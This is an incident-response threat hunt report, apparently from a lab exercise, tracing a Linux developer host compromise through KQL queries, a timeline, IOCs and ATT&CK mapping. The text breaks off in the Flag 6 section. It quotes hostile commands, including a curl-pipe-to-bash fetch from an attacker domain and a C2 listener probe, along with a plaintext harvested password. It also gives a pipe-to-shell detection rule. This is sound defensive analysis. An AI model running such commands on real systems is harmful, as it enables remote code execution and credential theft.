> **Classification:** `TLP:RED — CONFIDENTIAL`
> **Report ID:** `IR-2026-001`
> **Analyst:** `Michael Kirby`
> **Date:** `2026-05-XX`
> **Version:** `1.0`

---

# 🛡️ Threat Hunt Report — Operation Greenfield

---

## 📌 Executive Summary

A Linux development host (`GF-DEV01`) on the Greenfield estate was compromised via a developer account that executed a malicious install script piped directly from an external domain into a shell. This delivered a Sliver command-and-control implant (`helix-update`) which daemonized under systemd and spent approximately 104 minutes harvesting AWS, Kubernetes, and SSH credentials before the operator returned using a separate administrative account (`sancadmin`) via SSH from external infrastructure. The operator established a persistent SSH backdoor, deployed a second tool (`helix-sync`, identified as the Ligolo tunneling component) as a persistent systemd service, and attempted — but failed — to move laterally to a Windows workstation (`GF-WS01`) via SMB, WinRM, and WMI. At the time this hunt concluded, the original implant remained active and the SSH backdoor remained in place. Nine previously closed alerts were found to contain misclassified evidence directly relevant to this intrusion, including the initial DNS lookup for the malicious domain.

### 🔑 Key Findings at a Glance

| Category | Detail |
|----------|--------|
| 🔴 **Risk Rating** | `CRITICAL` |
| ⏱️ **Attacker Dwell Time** | `~104 minutes from implant daemonization (21:54:56 UTC) to operator return via sancadmin (23:39:13 UTC); operator session continued for several hours afterward; implant still running and backdoor still in place at end of investigation window` |
| 🖥️ **Systems Compromised** | `1 confirmed with persistent access — GF-DEV01; GF-WS01 reached via lateral movement (account access only, no confirmed payload execution); GF-DC01 enumerated but not confirmed compromised` |
| 👤 **Users Affected** | `a.kumar (initial access, developer account), sancadmin (operator return account, SSH backdoor target), t.harris (credentials harvested and used for lateral movement)` |
| 📦 **Data Exfiltrated** | `AWS credentials, Kubernetes credentials, and SSH private keys harvested from GF-DEV01 via implant child processes; exfiltration destination not confirmed in this hunt's telemetry — implant maintained outbound C2 capability throughout` |
| 🔑 **Credentials Exposed** | `a.kumar (session hijacked for initial delivery), sancadmin (SSH key-based access harvested by implant), t.harris (credentials harvested and validated for lateral movement), AWS and Kubernetes credential files on GF-DEV01` |
| 🌐 **Exfil Destination** | `Not confirmed in this hunt — implant (helix-update) maintained active C2 capability; operator infrastructure at 194.36.110.139 (AS9009, M247 Ltd)` |
| 🕵️ **Attacker Infrastructure** | `dl.abordsecurity.space and sync.abordsecurity.space (Cloudflare-fronted, IP ranges 104.16.x.x/104.21.x.x); operator C2/SSH source 194.36.110.139 (AS9009, M247 Ltd), additional listener observed on port 9080` |
| 📋 **Breach Notification Required** | `YES — confirmed harvesting of AWS, Kubernetes, and SSH credential material; persistent backdoor and active implant remained in place at conclusion of this hunt` |

---

## 🎯 Hunt Objectives

- Identify malicious activity across endpoints and network telemetry
- Reconstruct the full attack chain from initial access to exfiltration
- Correlate attacker behavior to MITRE ATT&CK techniques
- Determine the full scope of compromise for breach notification
- Document evidence, detection gaps, and remediation requirements

---

## 🧭 Scope & Environment

| Field | Detail |
|-------|--------|
| **Platform** | `Microsoft Sentinel` |
| **Workspace / Table** | `LinuxAuth_CL, LinuxShellHistory_CL, LinuxProcess_CL, LinuxSyscall_CL (auditd), LinuxNetwork_CL, LinuxFile_CL, Syslog (Sysmon for Linux)` |
| **Domain** | `Greenfield estate — internal naming convention "GF-"` |
| **Hosts In Scope** | `GF-DEV01 (Linux developer workstation, primary compromise), GF-WS01 (Windows workstation, lateral movement target), GF-DC01 (Domain Controller, enumeration target)` |
| **Data Sources** | `Custom log tables for Linux authentication, shell history, process creation, auditd syscall watch rules, network connections, and file events; Syslog for Sysmon-for-Linux event data` |
| **Investigation Window** | `2026-04-30 21:00 → 2026-05-01 04:00 UTC` |
| **Hunt Triggered By** | `Case file review — nine closed false-positive alerts and open tickets referencing GF-DEV01, GF-WS01, and GF-DC01 required re-validation; T1 had attributed activity to sancadmin and t.harris only` |

---

## 📚 Table of Contents

- [📌 Executive Summary](#-executive-summary)
- [🎯 Hunt Objectives](#-hunt-objectives)
- [🧭 Scope & Environment](#-scope--environment)
- [🧠 Hunt Overview](#-hunt-overview)
- [⏱️ Attack Timeline](#️-attack-timeline)
- [👤 Attacker Profile](#-attacker-profile)
- [🔴 IOC Summary](#-ioc-summary)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🛠️ Remediation & Containment Checklist](#️-remediation--containment-checklist)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

This investigation began with a case file review rather than a query. Nine alerts had been closed as false positives, and one — a DNS query to a suspicious domain, closed with the rationale "baseline traffic, allowlist incomplete" — fired squarely within what would become the initial access window. That closure was the first thread pulled.

Orienting in the workspace confirmed `LinuxAuth_CL` as the custom log table handling authentication telemetry across the Greenfield Linux estate. From there, the investigation pivoted to `LinuxShellHistory_CL` scoped to the developer account `a.kumar` on `GF-DEV01`, which surfaced the initial access command in plain text: `curl -fsSL https://dl.abordsecurity.space/install.sh | bash`. This was the exact DNS lookup the closed alert had caught and dismissed.

Process telemetry (`LinuxProcess_CL`) reconstructed the full staging chain in a 30-second window. The interactive shell (PID 32260) forked PID 34608 (curl, fetching the script) and PID 34609 (a subshell executing it). That subshell spawned PID 34612 (curl, downloading `/tmp/helix-update`) and PID 34615 (chmod, making it executable), then launched the implant via `nohup` as PID 34616. When the subshell exited, PID 34616 was orphaned and re-parented to PID 1 (systemd) — fully daemonized and detached from the terminal at 21:54:56 UTC. The account behind this entire chain was `a.kumar`, an account T1's investigation had not flagged at all.

With the implant running under systemd, `LinuxSyscall_CL` (auditd watch rules) revealed its behavior. Child processes of PID 34616 — `aws`, `kubectl`, `ssh`, and `bash` — triggered watch keys for `aws_creds`, `kube_creds`, and `ssh_user_keys` respectively, confirming systematic credential harvesting across cloud, container orchestration, and SSH key material. The implant binary itself most frequently triggered a `claude_data` watch key (6 occurrences). Network telemetry (`LinuxNetwork_CL`) showed the implant and related processes connecting exclusively to Cloudflare IP ranges (104.16.x.x and 104.21.x.x) — both the original download infrastructure and subsequent npm/node activity — making perimeter IP blocking impractical without broad collateral impact.

At 22:57:52 UTC, a child process of the implant appended an SSH public key to `a.kumar`'s `authorized_keys` file — a permanent backdoor. The key's comment field carried the operator's self-chosen handle: `octotempest@operator`. This single artifact became the strongest attribution signal in the investigation, and combined with the toolkit pattern (Sliver-style credential harvesting categories) and tradecraft observed, pointed to Scattered Spider (tracked by Microsoft as Octo Tempest, by Mandiant as UNC3944).

104 minutes after the implant daemonized, at 23:39:13 UTC, the operator authenticated via SSH as `sancadmin` from `194.36.110.139` (AS9009, M247 Ltd) — using credentials harvested by the implant's SSH key collection. Over the following SSH session, two files (`/tmp/helix-sync` and `/tmp/hbsync.exe`) were transferred via SFTP — never appearing in shell history because they were not typed commands. The operator's first priority, read chronologically from shell history, was persistence: `chmod +x /usr/local/bin/helix-sync`, `systemctl enable helix-sync`, `systemctl start helix-sync` — establishing a second tool (later fingerprinted by Microsoft Defender for Cloud as `HackTool:Linux/Ligolo.A!MTB`, the Ligolo tunneling component) as a reboot-surviving service.

With persistence and tunneling in place, the operator attempted lateral movement to `GF-WS01` (10.1.0.133) in a clear sequence: SMB file delivery via `smbclient` (using harvested `t.harris` credentials, return code 1 — failed), WinRM remote execution via `pwsh Invoke-Command` with a doubly-base64-encoded payload pointing to `https://sync.abordsecurity.space/helix-build-agent.exe` (return code 1 — failed), and WMI execution via `python3 wmi_exec.py` (return code 0 locally, but no confirmed execution on the target). Every attempt to land on Windows from `GF-DEV01` failed. However, `t.harris`'s credentials — validated through a mix of failed and successful authentication attempts consistent with credential testing rather than brute force — were used successfully via an SSH port-forward tunnel through `GF-DEV01`, landing `t.harris` on `GF-WS01` at 23:47 UTC (corroborated by four closed false-positive alerts all timestamped at that exact minute). From `GF-WS01`, `t.harris` performed SAMR enumeration against `GF-DC01` — seven `\\*\IPC$\samr` access events in 32 seconds.

At the close of the investigation window, the operator was observed probing their own C2 listener (`curl -I http://194.36.110.139:9080/`) — the same IP as the initial SSH access but a different port. Three artifacts remained on `GF-DEV01`: the original Sliver implant (`helix-update`, PID 34616) still running under systemd; the `authorized_keys` backdoor, permanently modified and persistent; and a dormant, never-cleaned-up copy of `helix-sync` sitting in `/tmp` alongside the installed and running service copy.

---

## ⏱️ Attack Timeline

| Timestamp (UTC) | Host | Action | MITRE Technique |
|----------------|------|--------|----------------|
| 2026-04-30 21:54:51 | GF-DEV01 | `a.kumar` executes `curl -fsSL https://dl.abordsecurity.space/install.sh \| bash` | T1078, T1059.004 |
| 2026-04-30 21:54:51–21:54:56 | GF-DEV01 | Staging chain: curl downloads `/tmp/helix-update` (PID 34612), chmod +x (PID 34615) | T1105 |
| 2026-04-30 21:54:56 | GF-DEV01 | `nohup /tmp/helix-update` launched (PID 34616); subshell exits, PID 34616 re-parented to PID 1 (systemd) — implant daemonized | T1543.002, T1036 |
| 2026-04-30 21:54:56 – 23:09:00 | GF-DEV01 | Implant spawns `aws`, `kubectl`, `ssh`, `bash` — credential harvesting (aws_creds, kube_creds, ssh_user_keys) | T1003, T1552.001, T1552.004 |
| 2026-04-30 22:57:52 | GF-DEV01 | Implant child process appends backdoor SSH public key (comment: `octotempest@operator`) to `a.kumar`'s `authorized_keys` | T1098.004 |
| 2026-04-30 23:39:13 | GF-DEV01 | Operator SSH's in as `sancadmin` from `194.36.110.139` — 104 minutes after implant daemonization | T1021.004, T1078 |
| 2026-04-30 23:39:13 – ~23:42:00 | GF-DEV01 | `sftp-server` transfers `/tmp/helix-sync` and `/tmp/hbsync.exe` to disk via the sancadmin SSH session | T1105 |
| 2026-04-30 ~23:42:00 | GF-DEV01 | `helix-sync` (Ligolo tunnel component) made executable, enabled, and started as a persistent systemd service | T1543.002, T1090 |
| 2026-04-30 23:42:00 – 02:00:00 | GF-DEV01 → GF-WS01 | Lateral movement attempts: SMB (`smbclient`, RC=1), WinRM (`pwsh Invoke-Command` w/ encoded payload, RC=1), WMI (`wmi_exec.py`, RC=0 locally, no confirmed remote execution) — all failed to land | T1021.002, T1021.006, T1047, T1027 |
| 2026-04-30 23:47:00 | GF-WS01 | `t.harris` lands via SSH port-forward through GF-DEV01 (appears to originate from 10.1.0.119); corroborated by four closed FP alerts (CLOSED-1 through CLOSED-4) | T1021.004, T1090 |
| 2026-04-30 (shortly after 23:47) | GF-WS01 → GF-DC01 | `t.harris` performs SAMR enumeration against GF-DC01 — 7 `\\*\IPC$\samr` accesses in 32 seconds | T1087.002 |
| 2026-05-01 (late session) | GF-DEV01 | Operator probes own C2 listener: `curl -I http://194.36.110.139:9080/` | T1071 |
| End of investigation window | GF-DEV01 | Three artifacts remain: `helix-update` (running), `authorized_keys` backdoor (persistent), `helix-sync` in `/tmp` (dormant copy) | T1543.002, T1098.004 |

---

## 👤 Attacker Profile

| Attribute | Detail |
|-----------|--------|
| **Attacker Handle / ID** | `octotempest@operator — embedded as the comment field on the backdoor SSH public key written to authorized_keys` |
| **Email / Account** | `N/A — handle observed only as an SSH key comment, no email address recovered` |
| **Cloud Account** | `N/A — not observed; AWS/Kubernetes credentials were harvested but no attacker-controlled cloud account identified in this hunt's telemetry` |
| **C2 Infrastructure** | `194.36.110.139 (AS9009, M247 Ltd) — source of sancadmin SSH session and probed listener on port 9080; dl.abordsecurity.space and sync.abordsecurity.space (both Cloudflare-fronted, 104.16.x.x/104.21.x.x)` |
| **Staging Server** | `https://dl.abordsecurity.space/install.sh (initial implant delivery); https://sync.abordsecurity.space/helix-build-agent.exe (referenced in failed WinRM payload)` |
| **Tools Used** | `helix-update (Sliver C2 implant), helix-sync (Ligolo tunneling component, fingerprinted as HackTool:Linux/Ligolo.A!MTB), hbsync.exe (Windows-targeted payload, never executed), wmi_exec.py, smbclient, pwsh/Invoke-Command, nc/nc.openbsd, curl, sftp-server` |
| **TTPs** | `curl \| bash delivery, nohup/systemd re-parenting for implant daemonization, SSH key-based credential harvesting and backdoor persistence, Cloudflare-fronted infrastructure to evade perimeter blocking, SSH port-forwarding for internal pivoting, multi-protocol lateral movement attempts (SMB/WinRM/WMI), double-base64-encoded PowerShell payloads, SAMR enumeration for AD recon` |
| **Targeting** | `Targeted — developer account compromise leading directly and methodically toward credential harvesting, persistence, and lateral movement toward Windows infrastructure and the domain controller; not consistent with opportunistic/automated activity` |
| **Sophistication Level** | `High — daemonization via process re-parenting to evade session-based detection, Cloudflare infrastructure fronting to defeat perimeter IP blocking, layered base64/UTF-16LE encoding on payloads, credential validation before lateral movement use (not brute force), and use of a known C2 framework (Sliver) with a dedicated tunneling component (Ligolo) for redundancy.` |
| **Credential OPSEC Failures** | `t.harris credential passed in plaintext via -U flag in smbclient command (greenfield.local/t.harris%Summer2025!); operator handle (octotempest@operator) left embedded in persistent SSH key comment — directly attributable artifact` |

### 🔍 OPSEC Mistakes Observed
- Plaintext credential (`greenfield.local/t.harris%Summer2025!`) passed via command-line flag in `smbclient`, fully visible in shell history
- Self-chosen operator handle (`octotempest@operator`) embedded directly in the persistent backdoor SSH key's comment field — a durable, directly attributable artifact
- Repeated, methodical lateral movement attempts against the same target (10.1.0.133) using the same harvested credential across multiple protocols, all logged in shell history with return codes intact
- Late-session probe of own C2 listener (`curl -I http://194.36.110.139:9080/`) directly ties the operator's session to their own infrastructure IP

---

## 🔴 IOC Summary

### 🌐 Network Indicators

| Type | Indicator | Context | Action |
|------|-----------|---------|--------|
| Domain | `dl.abordsecurity.space` | Initial implant delivery (install.sh, helix-update) | `BLOCK` |
| Domain | `sync.abordsecurity.space` | Referenced in failed WinRM payload (helix-build-agent.exe) | `BLOCK` |
| IP Range | `104.16.0.0/12, 104.21.0.0/16 (Cloudflare)` | Hosting infrastructure for both malicious domains — cannot be blocked outright due to shared CDN use | `MONITOR — alert on combination of Cloudflare destination + new/unsigned binary write` |
| IP | `194.36.110.139` | AS9009 (M247 Ltd) — source of sancadmin SSH session; C2 listener on port 9080 | `BLOCK` |
| IP | `10.1.0.119` | Apparent source of t.harris RDP to GF-WS01 (Kali machine — actual traffic tunneled via GF-DEV01) | `INVESTIGATE` |
| Port | `9080` (on 194.36.110.139) | Operator-probed C2 listener, late session | `BLOCK` |

### 📁 File Indicators

| Type | Indicator | Location | Hash (SHA256) |
|------|-----------|----------|--------------|
| Implant (Sliver C2) | `helix-update` | `/tmp/helix-update` (PID 34616, running under systemd) | `N/A — not captured` |
| Tunnel binary (Ligolo) | `helix-sync` (dormant copy) | `/tmp/helix-sync` | `N/A — not captured` |
| Tunnel binary (Ligolo, installed) | `helix-sync` | `/usr/local/bin/helix-sync` | `N/A — not captured` |
| Windows payload (undelivered) | `hbsync.exe` | `/tmp/hbsync.exe` | `N/A — not captured` |
| Lateral movement tool | `wmi_exec.py` | `/tmp/wmi_exec.py` | `N/A — not captured` |
| Systemd unit | `helix-sync.service` | `/etc/systemd/system/helix-sync.service` | `N/A` |
| Credential file (modified) | `authorized_keys` | `/home/a.kumar/.ssh/authorized_keys` — backdoor SSH key appended (comment: octotempest@operator) | `N/A` |

### 👤 Account Indicators

| Account | Type | Action Required |
|---------|------|----------------|
| `a.kumar` | `Compromised user — initial access vector, backdoor SSH key in authorized_keys` | `Password reset + remove backdoor key from authorized_keys + audit` |
| `sancadmin` | `Elevated account — SSH access used by operator, harvested via implant` | `Password reset + audit + review SSH key provenance` |
| `t.harris` | `Compromised user — credentials harvested and used for lateral movement to GF-WS01` | `Password reset + audit GF-WS01 and GF-DC01 activity under this account` |

### 🔑 Credential Exposure

| Credential | Where Found | Reset Required |
|------------|-------------|---------------|
| `greenfield.local/t.harris%Summer2025!` | Plaintext in `smbclient -U` flag, GF-DEV01 shell history (sancadmin session) | `YES — IMMEDIATE` |
| AWS credential files | Harvested by implant child process (`aws`, watch key `aws_creds`) | `YES — IMMEDIATE, rotate all AWS keys accessible from GF-DEV01` |
| Kubernetes credential files | Harvested by implant child process (`kubectl`, watch key `kube_creds`) | `YES — IMMEDIATE, rotate kubeconfig credentials accessible from GF-DEV01` |
| SSH private keys | Harvested by implant child processes (`ssh`/`bash`, watch key `ssh_user_keys`) — mechanism for both sancadmin and t.harris access | `YES — IMMEDIATE, rotate all SSH keys present on or accessible from GF-DEV01` |

---

## 🧬 MITRE ATT&CK Summary

| # | Flag Name | Tactic | Technique ID | Technique Name | Priority |
|--:|-----------|--------|-------------|----------------|----------|
| 1 | Workspace Orientation & Asset Discovery | Discovery | N/A | (Environment orientation — no attacker technique) | 🟡 Medium |
| 2 | Initial Access Vector Discovery | Initial Access / Execution | T1059.004, T1078 | Unix Shell / Valid Accounts | 🔴 Critical |
| 3 | Initial Implant Chain Staging | Execution / Persistence | T1105, T1543.002 | Ingress Tool Transfer / Create or Modify System Process | 🔴 Critical |
| 4 | Process Lineage & PID Tree Reconstruction | Discovery | N/A | (Forensic reconstruction — no attacker technique) | 🟡 Medium |
| 5 | Initial Access Account Identification | Initial Access | T1078 | Valid Accounts | 🔴 Critical |
| 6 | Closed Alert Re-Validation & Gap Analysis | Discovery | N/A | (Detection gap analysis — no attacker technique) | 🟠 High |
| 7 | Implant Process Verification | Defense Evasion | T1036, T1543.002 | Masquerading / Create or Modify System Process | 🔴 Critical |
| 8 | Implant Network Footprint via Cloudflare | Command and Control | T1583.006, T1102 | Acquire Infrastructure: CDN / Web Service | 🟠 High |
| 10 | Credential Harvesting — Implant Child Processes | Credential Access | T1003, T1552.001, T1552.004 | OS Credential Dumping / Unsecured Credentials | 🔴 Critical |
| 11 | Credential Harvesting — Implant Self-Reads | Credential Access | T1552.001 | Unsecured Credentials: Credentials in Files | 🟠 High |
| 13 | Backdoor SSH Key Write | Persistence | T1098.004 | Account Manipulation: SSH Authorized Keys | 🔴 Critical |
| 14 | C2 Infrastructure Enrichment | Command and Control | N/A | (Threat intelligence enrichment — no attacker technique) | 🟡 Medium |
| 15 | Operator Attribution Artifact | Command and Control | N/A | (Attribution — no attacker technique) | 🟡 Medium |
| 16 | Threat Actor Group Attribution | Command and Control | N/A | (Attribution — no attacker technique) | 🟡 Medium |
| 17 | Credential Validation Before Lateral Movement | Credential Access | T1110, T1078 | Brute Force (ruled out) / Valid Accounts | 🟠 High |
| 18 | Operator Landing Time Correlation | Lateral Movement | T1021.004 | Remote Services: SSH | 🟠 High |
| 19 | SSH Port Forward via Jump Host | Lateral Movement | T1090, T1021.004 | Proxy / Remote Services: SSH | 🔴 Critical |
| 20 | SAMR Enumeration Against Domain Controller | Discovery | T1087.002 | Account Discovery: Domain Account | 🟠 High |
| 21 | Harvested Credential Recovery | Credential Access | T1552.001 | Unsecured Credentials: Credentials in Files | 🔴 Critical |
| 22 | Credential Probing Across SMB Shares | Discovery / Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | 🟠 High |
| 23 | Lateral Movement Technique Sequence | Lateral Movement | T1021.002, T1021.006, T1047 | SMB / WinRM / WMI | 🔴 Critical |
| 24 | Malware Signature Detection Layer | Defense Evasion | T1036 | Masquerading | 🟡 Medium |
| 25 | Lateral Movement Outcome Analysis | Lateral Movement | T1021.002, T1021.006, T1047 | SMB / WinRM / WMI (all failed) | 🟠 High |
| 26 | Operator Dwell Time Calculation | Discovery | N/A | (Forensic timeline analysis — no attacker technique) | 🟡 Medium |
| 27 | Incident Response Decision Point | N/A | N/A | (SOC decision-making — no attacker technique) | 🟠 High |
| 28 | Cleanup Artifact Identification | Persistence | T1543.002, T1098.004, T1105 | Systemd Service / SSH Authorized Keys / Ingress Tool Transfer | 🔴 Critical |
| 29 | Cloudflare Network Footprint Confirmation | Command and Control | T1583.006 | Acquire Infrastructure: CDN | 🟠 High |
| 30 | Late-Session C2 Listener Probe | Command and Control | T1071 | Application Layer Protocol | 🟡 Medium |
| 31 | Sigma Detection Rule — Framework Identification | Defense Evasion | T1036, T1543.002 | Masquerading / Create or Modify System Process | 🟠 High |
| 32 | Sigma Logsource Identification | N/A | N/A | (Detection engineering — no attacker technique) | 🟡 Medium |
| 33 | Sigma Field Identification | N/A | N/A | (Detection engineering — no attacker technique) | 🟡 Medium |
| 34 | Sigma Severity Calibration | N/A | N/A | (Detection engineering — no attacker technique) | 🟡 Medium |
| 36 | Differentiating Implant Activity from Interactive Sessions | Defense Evasion | T1036, T1543.002 | Masquerading / Create or Modify System Process | 🟠 High |
| 37 | Source IP Field Identification for Operator Session | Initial Access | T1078 | Valid Accounts | 🟡 Medium |
| 38 | Second-Stage File Transfer via SFTP | Ingress Tool Transfer | T1105 | Ingress Tool Transfer | 🟠 High |
| 39 | Encoded WinRM Payload Decoding | Defense Evasion | T1027, T1059.001 | Obfuscated Files or Information / PowerShell | 🔴 Critical |
| 40 | Operator Session Phase Analysis — Primary Objective | Persistence | T1543.002 | Create or Modify System Process: Systemd Service | 🟠 High |
| 41 | End-of-Shift Artifact Synthesis | Persistence | T1543.002, T1098.004 | Systemd Service / SSH Authorized Keys | 🔴 Critical |

---

## 🔍 Flag Analysis

---

<details>
<summary>🚩 <strong>Flag 1: Workspace Orientation & Asset Discovery</strong> — <code>N/A</code> — 🟡 Medium</summary>

### 🎯 Objective
Locate the custom log table responsible for storing Linux authentication telemetry across the Greenfield estate.

### 📌 Finding
`LinuxAuth_CL` — the custom log table handling authentication telemetry, exposing identity actions like Logon, Logoff, and Elevate across the GF- host naming convention.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Table** | `LinuxAuth_CL` |
| **Host Filter** | `DvcHostname startswith "GF-"` |
| **Investigation Window** | `2026-04-30T21:00:00Z to 2026-05-01T04:00:00Z` |

### 💡 Why It Matters
Establishes the foundational identity telemetry source for the entire Linux estate before any deeper investigation begins.

### 🔗 Attack Chain Position
Starting point — workspace orientation before any hunting activity.

### 🔧 KQL Query Used

```kql
LinuxAuth_CL
| where DvcHostname startswith "GF-"
| where TimeGenerated between (datetime(2026-04-30T21:00:00Z) .. datetime(2026-05-01T04:00:00Z))
| take 10
```

### 🛡️ Detection Recommendation

**Hunting Tip:**
Custom or non-native telemetry streams in Sentinel are stored in custom log tables appended with `_CL`. Always orient yourself to the available custom tables and their scope before building queries.

**MITRE Reference:** N/A — environment orientation step.

</details>

---

<details>
<summary>🚩 <strong>Flag 2: Initial Access Vector Discovery</strong> — <code>T1059.004, T1078</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the exact command the user typed to download and execute the implant, which T1 had missed when escalating around the implant binary itself.

### 📌 Finding
`curl -fsSL https://dl.abordsecurity.space/install.sh | bash` — a web request piping a remote setup script directly into an interactive interpreter shell, executed by `a.kumar` on `GF-DEV01`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **User** | `a.kumar` |
| **Timestamp** | `2026-04-30T21:54:51Z (approx.)` |
| **Command** | `curl -fsSL https://dl.abordsecurity.space/install.sh \| bash` |

### 💡 Why It Matters
This is the initial access vector for the entire intrusion — a single piped command that downloaded and executed a remote script with no file ever written to disk for the script itself, and no user-facing warning.

### 🔗 Attack Chain Position
Root cause of the entire intrusion — everything in this hunt traces back to this single command.

### 🔧 KQL Query Used

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-04-30T21:54:40Z) .. datetime(2026-04-30T21:55:00Z))
| where Computer == "GF-DEV01"
| where ShellUser == "a.kumar"
| order by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF LinuxShellHistory_CL
AND Command contains "curl"
AND Command contains "| bash" or Command contains "|bash"
THEN ALERT — CRITICAL (Pipe-to-Shell Execution)
```

**Hunting Tip:**
To find human-typed input, pivot away from process creation logs to interactive shell history (`LinuxShellHistory_CL`). Setting a tight temporal boundary around the implant's first known execution and filtering to the suspected user isolates the exact string entered into the TTY session.

**MITRE Reference:** [T1059.004](https://attack.mitre.org/techniques/T1059/004) / [T1078](https://attack.mitre.org/techniques/T1078)

</details>

---

<details>
<summary>🚩 <strong>Flag 3: Initial Implant Chain Staging</strong> — <code>T1105, T1543.002</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the three core utilities/actions deployed by `install.sh` after it executed inside a subshell via the interactive pipe.

### 📌 Finding
`curl`, `chmod`, and `nohup` — deployed in rapid sequence by a single parent PID, downloading the implant, making it executable, and launching it detached in the background.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **Parent PID (login shell)** | `32260` |
| **Sibling PIDs (initial pipe)** | `34608 (curl, script download), 34609 (bash subshell)` |
| **Child PIDs (staging)** | `34612 (curl, downloads /tmp/helix-update), 34615 (chmod +x)` |
| **Final PID (launch)** | `34616 (nohup /tmp/helix-update)` |

### 💡 Why It Matters
This is the complete staging chain that took the intrusion from a single piped command to a running, daemonized implant. Each utility plays a distinct role: `curl` for delivery, `chmod` for weaponization, `nohup` for persistence/detachment.

### 🔗 Attack Chain Position
Directly follows the initial access command (Flag 2) — this is the script's payload, executed at machine speed inside the subshell it spawned.

### 🔧 KQL Query Used

```kql
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30T21:54:40Z) .. datetime(2026-04-30T21:55:10Z))
| where DvcHostname == "GF-DEV01"
| project TimeGenerated, 
EventType, 
EventResult, 
ParentPath = ActingProcessFilePath,
ParentProcess = ActingProcessId, 
ChildProcess = TargetProcessId, 
ChildPath = TargetProcessFilePath, 
TargetProcessCommandLine, 
TargetUsername
| order by TimeGenerated desc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF LinuxProcess_CL
AND ActingProcessId == <subshell PID from curl|bash pipe>
AND TargetProcessFilePath in ("curl", "chmod", "nohup")
AND count() within 30 seconds >= 3
THEN ALERT — CRITICAL (Rapid Download-Chmod-Detach Chain)
```

**Hunting Tip:**
Interactive shell history only logs human keystrokes — scripted subshells spawn binaries at machine speed from a single parent shell. Pivot to process telemetry, scope to a tight time window, and sort chronologically to reconstruct the full staging chain. When a process's parent dies and it's re-parented to PID 1 (systemd), that's a strong daemonization/persistence signal.

**MITRE Reference:** [T1105](https://attack.mitre.org/techniques/T1105) / [T1543.002](https://attack.mitre.org/techniques/T1543/002)

</details>

---

<details>
<summary>🚩 <strong>Flag 4: Process Lineage & PID Tree Reconstruction</strong> — <code>N/A</code> — 🟡 Medium</summary>

### 🎯 Objective
Map the ancestral PID lineage backwards from the active subshell up to the user's interactive login shell session.

### 📌 Finding
`32260 -> 34608 -> 34609` — the login shell (32260) forked into the active pipeline child (34608, curl), which passed code execution directly down into the subshell interpreter (34609).

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **Login Shell PID** | `32260` |
| **Pipeline Child PID (curl)** | `34608` |
| **Subshell Interpreter PID** | `34609` |

### 💡 Why It Matters
Establishes the complete generational path from the interactive TTY session down to the dynamic interpreter that executed the malicious script — confirms the entire chain originated from a single interactive session, not a separate or scheduled execution.

### 🔗 Attack Chain Position
Forensic reconstruction supporting Flags 2 and 3 — confirms the process ancestry of the staging chain.

### 🔧 KQL Query Used

```kql
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30T21:54:45Z) .. datetime(2026-04-30T21:55:00Z))
| where DvcHostname == "GF-DEV01"
| where TargetProcessCommandLine has "dl.abordsecurity.space" or ActingProcessId == 34609
| project TimeGenerated, TargetPID = TargetProcessId, TargetBinary = TargetProcessFilePath, ParentPID = ActingProcessId
| order by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Hunting Tip:**
Grouping process creation events based on a known downstream PID (the subshell) isolates the exact grandparent process context — useful for proving an entire chain originated from a single interactive session rather than multiple independent executions.

**MITRE Reference:** N/A — forensic reconstruction step.

</details>

---

<details>
<summary>🚩 <strong>Flag 5: Initial Access Account Identification</strong> — <code>T1078</code> — 🔴 Critical</summary>

### 🎯 Objective
Determine which account executed the initial delivery command vector, given that T1 had only identified `sancadmin` and `t.harris` as compromised.

### 📌 Finding
`a.kumar` — a developer account, executed the initial `curl | bash` delivery command, and was overlooked entirely in T1's original assessment.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **Account** | `a.kumar` |
| **Command** | `curl -fsSL https://dl.abordsecurity.space/install.sh \| bash (contains "install.sh")` |

### 💡 Why It Matters
Identifies the true initial access account, which had been completely missed by the prior investigation — `a.kumar` is the root of the entire compromise chain, not `sancadmin` or `t.harris`.

### 🔗 Attack Chain Position
Confirms account attribution for Flag 2's initial access command — establishes that the compromise chain began with a third, previously unidentified identity.

### 🔧 KQL Query Used

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-04-30T21:00:00Z) .. datetime(2026-05-01T04:00:00Z))
| where Computer == "GF-DEV01"
| where Command has "install.sh"
| project TimeGenerated, Computer, ShellUser, Command
```

### 🛡️ Detection Recommendation

**Hunting Tip:**
Don't rely on downstream ticket notes or alert titles for account attribution — trace the attack timeline back to its absolute origin point and correlate user fields directly in the relevant telemetry table.

**MITRE Reference:** [T1078](https://attack.mitre.org/techniques/T1078)

</details>

---

<details>
<summary>🚩 <strong>Flag 6: Closed Alert Re-Validation & Gap Analysis</strong> — <code>N/A</code> — 🟠 High</summary>

### 🎯 Objective
Review nine closed false-positive alerts to find a misclassified alert that fired directly within the initial foothold window.

### 📌 Finding
`CLOSED-5` — "GF - DNS Query to Suspicious Domain," fired between 21:50 and 22:05 UTC, closed as a false positive with the rationale "Baseline traffic. Allowlist incomplete..." This alert captured the exact outbound DNS lookup for `dl.abordsecurity.space` at the moment of compromise.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Alert** | `CLOSED-5` |
| **Alert Title** | `GF - DNS Query to Suspicious Domain` |
| **Original Closure Rationale** | `Baseline traffic. Allowlist incomplete.` |
| **Actual Cause** | `DNS lookup for dl.abordsecurity.space immediately preceding the curl | bash delivery command` |

### 💡 Why It Matters
